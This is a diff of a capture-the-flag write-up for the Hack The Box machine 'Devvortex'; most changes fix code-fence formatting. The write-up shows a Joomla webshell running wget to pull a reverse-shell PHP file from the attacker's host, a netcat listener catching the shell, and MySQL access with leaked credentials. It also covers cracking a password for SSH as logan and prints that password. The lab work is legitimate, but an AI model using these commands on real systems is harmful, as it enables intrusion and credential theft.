@@ -84,8 +84,7 @@ DB user: lewis
 DB password: ******
 DB name: joomla
 DB prefix: sd4fg_
-DB encryption 0
-                      
+DB encryption 0                   
 ```
 
 DB user: lewis
@@ -112,14 +111,15 @@ Open new terminal go to folder webshell and run python -m http.server 80
 
 http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php?action=exec&cmd=wget -O /var/www/dev.devvortex.htb/c.php http://10.10.14.27/rev.php
 
-```Output
+``Output
 "--2023-11-26 04:55:55--  http://10.10.14.27/rev.php\nConnecting to 10.10.14.27:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2585 (2.5K) [application/octet-stream]\nSaving to: '/var/www/dev.devvortex.htb/c.php'\n\n     0K ..                                                    100% 3.39M=0.001s\n\n2023-11-26 04:55:55 (3.39 MB/s) - '/var/www/dev.devvortex.htb/c.php' saved [2585/2585]\n\n"
-```
+``
 Its Work Uploaded!!
 
 http://dev.devvortex.htb/c.php
 
-```
+
+``
 nc -lvnp 1337  
 listening on [any] 1337 ...
 connect to [10.10.14.27] from (UNKNOWN) [10.10.11.242] 33522
@@ -131,15 +131,17 @@ logan    pts/3    10.10.16.11      03:53   31:03  18.99s  0.03s sshd: logan [pri
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sh: 0: can't access tty; job control turned off
 $
-```
+``
 
 for login ssh you need login mysql u can use adminer or mysql command like this
 
-do not forgot spawn tty shell python , because if you not spawn tty its now work 
+do not forgot spawn tty shell python , because if you not spawn tty its now work
 
-```mysql -u lewis -p joomla ```
+`
 
-```Enter password: 
+mysql -u lewis -p joomla 
+
+Enter password: 
 **********
 mysql> use joomla;
 show tables;
@@ -156,6 +158,8 @@ copy the password and hash it use john the ripper
 ssh logan@dev.devvortex.htb 
 
 Hashes password:tequieromucho
+
+
 ```
 
 
